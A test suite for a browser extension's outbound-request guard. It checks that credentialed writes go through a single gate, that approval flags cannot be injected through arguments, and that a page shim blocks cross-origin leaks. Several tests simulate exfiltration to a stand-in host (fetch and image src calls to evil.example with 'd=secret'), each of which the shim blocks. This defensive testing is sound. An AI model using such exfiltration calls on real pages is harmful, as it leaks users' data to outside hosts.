// @ts-check
// Hygiene: there is ONE write gate. Nothing in the extension may issue a request with the page's credentials except through pageFetch(), and pageFetch()
// refuses a write that did not pass writeGate(). This test reads the source so that a new route cannot be added without going through it.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { writeGate, PASS } from "./extension/shared/outbound.js";
import { pageFetch } from "./extension/caps/net.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const EXT = path.join(HERE, "extension");
const files = (/** @type {string} */ d) => fs.readdirSync(path.join(EXT, d)).filter(f => f.endsWith(".js")).map(f => ({ rel: `${d}/${f}`, src: fs.readFileSync(path.join(EXT, d, f), "utf8") }));
const all = [...files("caps"), ...files("lib"), ...files("shared")];

test("the page-side fetch() call exists only in pageFetch (net.js) and in the guard shims (outbound.js)", () => {
  const holders = all.filter(f => /(^|[^.\w])fetch\(/.test(f.src)).map(f => f.rel).sort();
  // outbound.js wraps window.fetch inside strings; sitecache and presence use none; icon code is gone.
  assert.deepEqual(holders, ["caps/net.js"]);
  const net = all.find(f => f.rel === "caps/net.js")?.src || "";
  const open = net.indexOf("export async function pageFetch");
  const close = net.indexOf("\nexport ", open + 10) > 0 ? net.indexOf("\n}\n", open) : net.length;
  const inside = net.slice(open, close);
  const hits = [...net.matchAll(/(^|[^.\w])fetch\(/g)].map(m => m.index || 0);
  // probeGuard fires one fetch at a nonce path on the frame's own origin from a string, to prove the interceptor is live; it is failed at the pause and carries nothing of the person's.
  const pOpen = net.indexOf("async function probeGuard"), pClose = net.indexOf("\n}\n", pOpen);
  assert.ok(hits.length > 0 && hits.every(i => (i > open && i < close + 1) || (i > pOpen && i < pClose)), "every fetch( in net.js is inside pageFetch (or the guard's probe)");
  assert.match(inside, /writeGate|PASS/, "pageFetch checks the pass");
});

test("every caller of pageFetch gets its pass from writeGate", () => {
  const callers = all.filter(f => /\bpageFetch\(/.test(f.src) && !/export async function pageFetch/.test(f.src) || (f.rel === "caps/net.js"));
  for (const f of callers) {
    const calls = [...f.src.matchAll(/\bpageFetch\(/g)].length - (f.rel === "caps/net.js" ? 1 : 0);
    if (calls <= 0) continue;
    assert.ok(/writeGate\(/.test(f.src), `${f.rel} calls pageFetch but never asks writeGate`);
    assert.ok(/gate\b/.test(f.src.slice(f.src.indexOf("pageFetch("))), `${f.rel} does not pass the gate to pageFetch`);
  }
});

test("the pass cannot be forged by importing it: PASS is imported only where pageFetch lives", () => {
  const users = all.filter(f => /\bPASS\b/.test(f.src) && !f.rel.endsWith("outbound.js")).map(f => f.rel);
  assert.deepEqual(users, ["caps/net.js"]);
});

test("no capability runs a script through Fetch-domain commands that re-issue requests", () => {
  // Fetch.fulfillRequest (a mock) and failRequest are allowed in net.js and devtools.js (they answer or stop the page's own request); continueRequest may only
  // pass a request through. No other file may use the Fetch domain.
  const users = all.filter(f => /"Fetch\./.test(f.src)).map(f => f.rel).sort();
  assert.deepEqual(users, ["caps/net.js"]);
});

test("writeGate: reads pass; a write passes only when asked or covered; otherwise it comes back held with its kind", () => {
  assert.equal(writeGate("GET", "https://a.example/x", "").pass, PASS);
  assert.equal(writeGate("post", "https://a.example/x", "{}", { asked: true }).pass, PASS);
  assert.equal(writeGate("DELETE", "https://a.example/x/1", "", { writeOk: true }).pass, PASS);
  const h = /** @type {any} */ (writeGate("DELETE", "https://a.example/x/1", "", {}).held);
  assert.equal(h.kind, "delete");
  assert.equal(h.write, true);
  assert.equal(writeGate("PUT", "https://a.example/x/1", "").pass, undefined);
});

test("pageFetch itself refuses a write with no pass, even if a caller forgets the gate", async () => {
  const ctx = { cdp: { attach: async () => {}, send: async () => ({}) }, tabs: { get: async () => ({}) } };
  await assert.rejects(pageFetch(/** @type {any} */ (ctx), 1, { url: "https://a.example/x", method: "DELETE" }), { code: "blocked" });
  await assert.rejects(pageFetch(/** @type {any} */ (ctx), 1, { url: "https://a.example/x", method: "POST" }, { gate: /** @type {any} */ ({ pass: Symbol("forged") }) }), { code: "blocked" });
});

test("no op reads an approval from args: asked, writeOk, release, writeBudget and agent are read from trust only", () => {
  const bad = [];
  for (const f of all) {
    for (const m of f.src.matchAll(/\b(args|a|stepArgs|input)\??\.(asked|writeOk|release|writeBudget|agent)\b/g)) {
      const line = f.src.slice(0, m.index).split("\n").length;
      // allowed: comments and the trust helpers themselves
      const text = f.src.split("\n")[line - 1].trim();
      if (text.startsWith("//") || text.startsWith("*") || f.rel === "shared/trust.js" || f.rel === "caps/index.js") continue;
      bad.push(`${f.rel}:${line}: ${text.slice(0, 80)}`);
    }
  }
  assert.deepEqual(bad, [], "an op reads an approval from args");
});

test("dispatch refuses approval keys where an op could read them (top-level args, each batch step's args) and only there", async () => {
  const { dispatch, trustKeyIn, cleanTrust } = await import("./extension/caps/index.js");
  assert.equal(trustKeyIn({ writeOk: true }), "writeOk");
  assert.equal(trustKeyIn({ steps: [{ op: "api.call", args: { entry: "e", asked: true } }] }), "asked");
  // opaque data sent to a site is never inspected: a real API may have fields called agent, release or asked
  assert.equal(trustKeyIn({ entry: "e", args: { body: { agent: "x", release: "2.1", asked: "why", writeOk: 1, nested: [{ writeBudget: 1 }] } } }), "");
  assert.equal(trustKeyIn({ steps: [{ op: "api.call", args: { entry: "e", args: { body: { agent: "x", release: "v2" } } } }] }), "");
  assert.equal(trustKeyIn({ selector: { name: "release" } }), "", "a VALUE named release is not a key");
  assert.deepEqual(cleanTrust({ asked: "yes", writeOk: 1, release: { sig: "s", evil: 1 }, writeBudget: { create: 2.9, edit: -4, origin: "https://a.example", tab: 3, tabOrigin: "https://b.example", x: 1 }, extra: true }), { release: { sig: "s" }, writeBudget: { create: 2, edit: 0, origin: "https://a.example", tab: 3, tabOrigin: "https://b.example" } });
  const ctx = { stopped: () => false, floorAllows: async () => ({ allow: true }) };
  await assert.rejects(dispatch("tabs.list", { asked: true }, /** @type {any} */ (ctx)), { code: "bad_request" });
});

test("an api.call whose body has fields named agent and release is not refused", async () => {
  const { dispatch } = await import("./extension/caps/index.js");
  const seen = /** @type {any[]} */ ([]);
  const { register } = await import("./extension/caps/index.js");
  register({ name: "probe", ops: { "probe.echo": async (/** @type {any} */ a) => { seen.push(a); return { ok: true }; } } });
  const ctx = { stopped: () => false, floorAllows: async () => ({ allow: true }) };
  await dispatch("probe.echo", { entry: "e", args: { body: { agent: "Jane", release: "2024-05", asked: "no", writeOk: "n/a" }, query: { release: "1" }, headers: { "x-agent": "kit" } } }, /** @type {any} */ (ctx));
  assert.equal(seen[0].args.body.agent, "Jane");
});

test("the page shim is a second layer of containment: under an allow list a script may only fetch this page's origin and the origins it was given", async () => {
  const vm = await import("node:vm");
  const { guardInstallWrites, guardCollect } = await import("./extension/shared/outbound.js");
  const reached = /** @type {string[]} */ ([]);
  const win = /** @type {any} */ ({
    location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" },
    fetch: async (/** @type {any} */ u) => { reached.push(String(u)); return { ok: true }; },
    XMLHttpRequest: class { open() {} send() {} }, navigator: { sendBeacon: () => true }, HTMLFormElement: class { submit() {} requestSubmit() {} },
    Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} },
    __vyreAllow: ["https://api.example"], URL, Promise, TypeError, Error, Array, String, Object,
  });
  win.window = win;
  vm.createContext(win);
  vm.runInContext(guardInstallWrites, win);
  await assert.rejects(win.fetch("https://evil.example/collect?d=secret"), /held/);
  await win.fetch("https://api.example/read");
  await win.fetch("https://app.example/same");
  await win.fetch("/relative");
  assert.deepEqual(reached, ["https://api.example/read", "https://app.example/same", "/relative"], "only the allowed origins were reached");
  const blocked = vm.runInContext(guardCollect, win);
  assert.equal(blocked.length, 1);
  assert.match(blocked[0].why, /evil\.example/);
});

test("the shim's allow list cannot be tampered with after install, and under the eval guard workers and popups are refused", async () => {
  const vm = await import("node:vm");
  const { guardInstallWrites, guardCollect } = await import("./extension/shared/outbound.js");
  const win = /** @type {any} */ ({
    location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" },
    fetch: async () => ({ ok: true }), XMLHttpRequest: class { open() {} send() {} }, navigator: { sendBeacon: () => true, serviceWorker: { register: async () => ({}) } },
    HTMLFormElement: class { submit() {} requestSubmit() {} }, Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} },
    Worker: class {}, SharedWorker: class {}, open: () => ({}), __vyreAllow: ["https://api.example"], URL, Promise, TypeError, Error, Array, String, Object,
  });
  win.window = win;
  vm.createContext(win);
  vm.runInContext(guardInstallWrites, win);
  assert.equal(win.__vyreAllow, undefined, "the list is not left on the page");
  win.__vyreAllow = ["https://evil.example"]; // a script trying to add its own origin after install
  await assert.rejects(win.fetch("https://evil.example/collect"), /held/, "a list the script writes later counts for nothing");
  assert.throws(() => new win.Worker("blob:x"), /held/);
  assert.throws(() => new win.SharedWorker("x"), /held/);
  await assert.rejects(Promise.resolve().then(() => win.navigator.serviceWorker.register("/sw.js")), /held/);
  assert.throws(() => win.open("https://evil.example"), /held/);
  const blocked = vm.runInContext(guardCollect, win);
  assert.ok(blocked.length >= 5);
  // without an allow list (a click, not an eval) nothing of this is touched
  const plain = /** @type {any} */ ({ location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" }, fetch: async () => ({}), XMLHttpRequest: class { open() {} send() {} }, navigator: {}, HTMLFormElement: class { submit() {} requestSubmit() {} }, Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} }, Worker: class {}, open: () => "opened", URL, Promise, TypeError, Error, Array, String, Object });
  plain.window = plain; vm.createContext(plain);
  vm.runInContext("window.__vyreWrites = true;" + (await import("./extension/shared/outbound.js")).guardInstall, plain);
  assert.equal(plain.open(), "opened");
  assert.doesNotThrow(() => new plain.Worker("x"));
});

test("under the eval guard an image or media src to another origin is refused by the shim, an allowed one loads, and restore puts the setter back", async () => {
  const vm = await import("node:vm");
  const { guardInstallWrites, guardCollect } = await import("./extension/shared/outbound.js");
  const loaded = /** @type {string[]} */ ([]);
  class Img { set src(v) { loaded.push(String(v)); } get src() { return loaded[loaded.length - 1] || ""; } }
  class Media { set src(v) { loaded.push(String(v)); } get src() { return ""; } }
  const win = /** @type {any} */ ({
    location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" },
    fetch: async () => ({ ok: true }), XMLHttpRequest: class { open() {} send() {} }, navigator: { sendBeacon: () => true },
    HTMLFormElement: class { submit() {} requestSubmit() {} }, Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} },
    HTMLImageElement: Img, HTMLMediaElement: Media, __vyreAllow: ["https://api.example"], URL, Promise, TypeError, Error, Array, String, Object,
  });
  win.window = win;
  vm.createContext(win);
  vm.runInContext(guardInstallWrites, win);
  const d = new win.HTMLImageElement(); d.src = "https://evil.example/p.gif?d=secret";
  const a = new win.HTMLMediaElement(); a.src = "https://evil.example/a.mp3";
  d.src = "https://api.example/ok.gif"; d.src = "/local.gif";
  assert.deepEqual(loaded, ["https://api.example/ok.gif", "/local.gif"]);
  const blocked = vm.runInContext(guardCollect, win);
  assert.equal(blocked.filter((/** @type {any} */ b) => /evil\.example/.test(b.url)).length, 2);
  // guardCollect took the shim off
  d.src = "https://evil.example/after"; // the guard is off: the page's own setter again
  assert.equal(loaded[loaded.length - 1], "https://evil.example/after");
});
